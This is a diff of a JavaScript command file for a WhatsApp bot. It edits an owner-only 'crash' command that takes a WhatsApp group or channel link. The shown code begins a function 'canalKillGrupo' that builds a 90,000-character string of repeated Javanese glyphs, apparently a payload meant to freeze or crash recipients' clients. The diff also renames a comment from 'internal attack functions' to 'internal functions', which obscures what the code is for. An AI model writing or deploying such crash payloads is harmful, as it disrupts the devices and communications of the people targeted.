@@ -1,11 +1,11 @@
 export default {
   command: ['crash'],
   category: 'owner',
+  isOwner: true, // <--- Esto es lo que faltaba para que el bot reconozca que es para el dueño
   run: async (client, m, { text, isOwner, usedPrefix, command }) => {
-    // Verificación de propietario
-    if (!isOwner) {
-      return m.reply('Solo el propietario puede usar este comando.')
-    }
+    
+    // Verificación de seguridad interna (opcional si el handler ya lo hace)
+    if (!isOwner) return m.reply('Solo el propietario puede usar este comando.')
 
     // Verificación de enlace
     if (!text || !text.includes('whatsapp.com')) {
@@ -29,7 +29,7 @@ export default {
       }, { quoted: m })
     }
 
-    // --- FUNCIONES INTERNAS DE ATAQUE ---
+    // --- FUNCIONES INTERNAS ---
 
     const canalKillGrupo = async () => {
       const basura = 'ꦾ'.repeat(90000)
